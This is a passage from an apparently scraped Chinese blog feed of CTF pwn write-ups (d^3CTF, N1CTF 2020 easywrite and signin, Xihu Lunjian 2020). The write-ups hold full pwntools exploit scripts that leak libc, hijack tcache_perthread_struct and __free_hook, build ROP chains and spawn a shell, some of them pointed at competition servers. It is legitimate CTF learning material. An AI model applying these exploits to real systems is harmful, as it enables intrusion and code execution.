class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdi\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rsi\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>base_addr<span class="token operator">+</span><span class="token number">0x202300</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdx\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># write</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdi\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rsi\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>base_addr<span class="token operator">+</span><span class="token number">0x202300</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdx\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>set_value<span class="token punctuation">(</span>base_addr<span class="token operator">+</span><span class="token number">0x850</span><span class="token punctuation">,</span>index<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>set_value<span class="token punctuation">(</span>base_addr<span class="token operator">+</span><span class="token number">0x202080</span><span class="token punctuation">,</span>index<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>set_value<span class="token punctuation">(</span>base_addr<span class="token operator">+</span><span class="token number">0x9f8</span><span class="token punctuation">,</span>index<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token keyword">print</span> len<span class="token punctuation">(</span>rop<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">"d^3CTF"</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span><span class="token string">"flag"</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>payload<span class="token operator">+</span>ropsendInfo<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2019 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UAF </tag>
            
            <tag> 栈溢出 </tag>
            
            <tag> libc 2.29 double free </tag>
            
            <tag> malloc_consolidation </tag>
            
            <tag> io leak </tag>
            
            <tag> 栈上的格式化字符串 </tag>
            
            <tag> 打开输出流 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-N1CTF部分PWN解题</title>
      <link href="/2020/10/20/2020-n1ctf-bu-fen-pwn-jie-ti/"/>
      <url>/2020/10/20/2020-n1ctf-bu-fen-pwn-jie-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>tag：hijacking tcache_perthread_struct、libc 2.31、C++、</p><p>easywrite是2.31题目，改掉vmmap的地址中 tcache_perthread_struct地址为我们可控内存，写free_hook，进行system(“/bin/sh”)</p><p>signin是2.27 C++题目，向前越界leak libc，改对应tcache 0x40的chunk地址为hook，分配写入system</p><h1 id="easywrite"><a href="#easywrite" class="headerlink" title="easywrite"></a>easywrite</h1><h2 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h2><p>这道题是2.31的一道题：一开始输出libc地址，可以输入0x2ff长度的字节流到bss段，可以控制这个bss段地址写入任意地址，后面还有一个分配0x40大小chunk并输入的一个操作。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>一开始想到的是io attack，进行FSOP，但是调试发现2.31中io_jump的函数全部都将调用函数指针改为调用具体函数了，所以FSOP失效，查看了一些函数都是这样：<br>例2.29：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2020-n1ctf-bu-fen-pwn-jie-ti/0.png"></div><p>例2.31：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2020-n1ctf-bu-fen-pwn-jie-ti/1.png"></div>可以看到调用函数指针都被改掉了<p>所以暂时放下FSOP，只能考虑下背的做法。最后想到可以伪造 tcache_perthread_struct，然后通过后面的malloc将hook分配出来。</p><p>在这里也可以清楚的知道，2.31对于tcache分配也没有检查。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>debug <span class="token operator">=</span> <span class="token number">0</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./easywrite"</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./easywrite"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/usr/lib/x86_64-linux-gnu/libc-2.31.so"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"124.156.183.246"</span><span class="token punctuation">,</span><span class="token number">20000</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./easywrite"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/usr/lib/x86_64-linux-gnu/libc-2.31.so"</span><span class="token punctuation">)</span>one_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe6ce3</span><span class="token punctuation">,</span><span class="token number">0xe6ce6</span><span class="token punctuation">,</span><span class="token number">0xe6ce9</span><span class="token punctuation">]</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"gift:0x"</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x7ffff7dc5000</span> <span class="token operator">-</span> <span class="token number">0x7ffff7e53c50</span>success<span class="token punctuation">(</span><span class="token string">"libc addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"message:"</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> libc<span class="token punctuation">.</span>addressstatic_libc <span class="token operator">=</span> <span class="token number">0x7ffff7dc5000</span><span class="token comment" spellcheck="true"># payload = p64(0xfbad1800)+p64(0x00007ffff7fb1643-static_libc+libc_base)*4+p64(0x00007ffff7fb1644-static_libc+libc_base)+p64(0x00007ffff7fb1643-static_libc+libc_base)+p64(libc.search("/bin/sh\x00").next())+p64(0x00007ffff7fb1644-static_libc+libc_base)</span><span class="token comment" spellcheck="true"># payload+= p64(0)*4+p64(0x00007ffff7fb16a0-static_libc+libc_base)+p64(0x0000000000000001)</span><span class="token comment" spellcheck="true"># payload+= p64(0xffffffffffffffff)+p64(0x000000000a000000)+p64(0x00007ffff7fb34b0-static_libc+libc_base)</span><span class="token comment" spellcheck="true"># payload+= p64(0xffffffffffffffff)+p64(0)+p64(0x00007ffff7fb0780-static_libc+libc_base)+p64(0x0000000000000000)*6</span><span class="token comment" spellcheck="true"># payload+= p64(libc_base+(0x7ffff7fb2560-static_libc)-0x8)+p64(0x00007ffff7dd0680-static_libc+libc_base)+p64(libc.sym['system'])</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000100000000</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">17</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Where to write?:"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># p.sendline(p64(libc.sym['_IO_list_all']))</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x7ffff7fb84f0</span><span class="token operator">-</span>static_libc<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token operator">+</span><span class="token string">"/bin/sh;"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># p.recvuntil("message?:")</span><span class="token comment" spellcheck="true"># raw_input()</span><span class="token comment" spellcheck="true"># p.sendline("/bin/sh;"+p64(libc.sym['system']))</span><span class="token comment" spellcheck="true"># p.sendline(p64(libc.address+0x7ffff7ffdf68-static_libc))</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>libc 2.27 C++中的题目，同样类似vector的机制，vector的首指针和当前指针，以及分配的henp尾部指针都存放在bss上，根据当前指针进行写入，如果当前指针和尾部指针相等，那么重新分配更大的chunk。</p><p>删除的时候将当前指针-8。</p><p>show的时候打印出当前指针-8处的内容</p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2020-n1ctf-bu-fen-pwn-jie-ti/2.png"></div>漏洞存在于删除的时候没有越界检查，那么就可以无限向上溢出<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>我们需要创建大于0x420的chunk，进入unsorted bin，通过上溢泄露libc地址。同时在分配的过程中会将chunk释放掉进入tcache中，这样的话就可以继续上溢改tcache pthread header中chunk的地址，这样我们就可以分配到hook地址了。发现执行不了system(“/bin/sh”)，那么就直接cat flag即可</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>debug <span class="token operator">=</span> <span class="token number">0</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims             <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>itv     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># p = process("./signin")</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./signin'</span><span class="token punctuation">,</span>env<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'LD_PRELOAD'</span><span class="token punctuation">:</span><span class="token string">'./libc.so'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./signin"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"47.242.161.199"</span><span class="token punctuation">,</span><span class="token number">9990</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./signin"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Index:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Number:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Index:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"Index:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x1a0</span><span class="token operator">+</span><span class="token number">0x80</span><span class="token operator">-</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x7ffff7443000</span><span class="token operator">-</span><span class="token number">0x7ffff782eca0</span>success<span class="token punctuation">(</span><span class="token string">"libc addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">9428</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">7449354444534474664</span><span class="token operator">+</span><span class="token number">0x163</span><span class="token operator">-</span><span class="token number">0x7a8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2020 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ PWN初探 </tag>
            
            <tag> hijacking tcache_perthread_struct </tag>
            
            <tag> libc 2.31 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-西湖论剑部分PWN解题</title>
      <link href="/2020/10/20/2020-xi-hu-lun-jian-bu-fen-pwn-jie-ti/"/>
      <url>/2020/10/20/2020-xi-hu-lun-jian-bu-fen-pwn-jie-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-summary"><a href="#0x01-summary" class="headerlink" title="0x01 summary"></a>0x01 summary</h1><p><strong>mmutage</strong>：两个洞一个double free和栈溢出，栈溢出后面接一个输出可以leak canary，由于给了栈地址并且可以edit stack所以可以double free改fd到stack上，这样就可以rop先泄漏libc，然后再csu来call read到ret位置写入system(“/bin/sh”)来getshell。</p><p><strong>noleakfmt</strong>：看到stdout结构体的地址在当前printf栈地址的上面，这里第一步改双链位置上的stack值到程序地址的地方，我们第一步改printf返回地址为start抬高栈地址。后面就可以改stdout的file结构体的fileno为2就可以成功输出了。</p><p><strong>managesystem</strong>：32位的mips堆题，有个heapoveflow的漏洞，可以利用unlink劫持note_list进行leak libc并劫持got表。</p><p><strong>ezhttp</strong>:模拟http请求，2.27 double free, 劫持hook为setcontext+53进行orw</p><h1 id="0x02-mmutag"><a href="#0x02-mmutag" class="headerlink" title="0x02 mmutag"></a>0x02 mmutag</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2020-xi-hu-lun-jian-bu-fen-pwn-jie-ti/0.png"></div>got表可劫持，PIE没开<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>给了个栈地址：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2020-xi-hu-lun-jian-bu-fen-pwn-jie-ti/1.png"></div><p>double free：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2020-xi-hu-lun-jian-bu-fen-pwn-jie-ti/2.png"></div><p>栈溢出：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2020-xi-hu-lun-jian-bu-fen-pwn-jie-ti/3.png"></div><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>利用栈溢出打印出canary，double free改fd劫持stack，写rop一个是泄露libc’地址，再一个是改got表，csu再写入rsp，执行system(“/bin/sh”)进行getshell即可</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'split'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./mmutag"</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./mmutag"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span 